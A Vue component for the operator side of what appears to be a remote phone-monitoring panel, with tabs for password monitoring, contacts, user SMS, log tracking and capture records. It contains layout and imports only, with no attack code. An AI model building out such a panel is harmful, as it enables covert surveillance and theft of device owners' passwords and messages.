<template>
  <div class="common-layout">
    <el-container>
      <el-header><TopHeader></TopHeader></el-header>
      <el-container>
        <!-- <el-aside>
          <Phone></Phone>
        </el-aside>
        <el-aside width="200px">
          <ParamList></ParamList>
        </el-aside> -->

        <el-main>
          <el-row class="top-nav" :gutter="20">
            <el-col :span="7">
              <Phone></Phone>
            </el-col>
            <el-col :span="3">
              <ParamList></ParamList>
            </el-col>
            <el-col :span="14">
              <RightOne></RightOne>
              <el-tabs
                v-model="state.activeTab"
                type="border-card"
                @tab-click="handleClick"
              >
                <el-tab-pane :label="$t('常用')" name="tab-1">
                  <common></common>
                </el-tab-pane>
                <el-tab-pane :label="$t('应用列表')" name="tab-2">
                  <appList></appList>
                </el-tab-pane>
                <el-tab-pane :label="$t('密码监控')" name="tab-3">
                  <passwordControl></passwordControl>
                </el-tab-pane>
                <el-tab-pane :label="$t('通讯录')" name="tab-4">
                  <messagePage></messagePage>
                </el-tab-pane>
                <el-tab-pane :label="$t('用户短信')" name="tab-5">
                  <userSms></userSms>
                </el-tab-pane>
                <el-tab-pane :label="$t('日志跟踪')" name="tab-6">
                  <logTracking></logTracking>
                </el-tab-pane>
                <el-tab-pane :label="$t('抓取记录')" name="tab-7">
                  <catchRecord></catchRecord>
                </el-tab-pane>
                <el-tab-pane :label="$t('5.0操作')" name="tab-8">
                  <Operation></Operation>
                </el-tab-pane>
              </el-tabs>
            </el-col>
          </el-row>
        </el-main>
      </el-container>
    </el-container>
  </div>
</template>
<script setup>
import TopHeader from "./components/topHeader.vue";
import Phone from "./components/phone.vue";
import ParamList from "./components/paramList.vue";
import RightOne from "./components/rightOne.vue";
import Operation from "./components/operation.vue";
import common from "./components/common.vue";
import appList from "./components/appList.vue";
import passwordControl from "./components/passwordControl.vue";
import messagePage from "./components/messagePage.vue";
import userSms from "./components/userSms.vue";
import catchRecord from "./components/catchRecord.vue";
import logTracking from "./components/logTracking.vue";
// import { OnlineDeviceGetApps } from "@/api/operatingApi/index";
import { reactive } from "vue";
import { useI18n } from "vue-i18n";
const { t } = useI18n();

const state = reactive({
  activeTab: "tab-8",
});

// const applist = ref([]);
// switch (state.activeTab) {
//   case "tab-2": //应用列表
//     getApps();
//     break;

//   default:
//     break;
// }
// const getApps = () => {
//   OnlineDeviceGetApps().then((res) => {
//     console.log("获取列表", res);
//     applist.value = res.data;
//   });
// };

console.log("操作端");

onMounted(() => {
  console.log("操作端");
});
</script>
<style lang="scss">
.top-nav {
  margin-top: 20px;
}
</style>
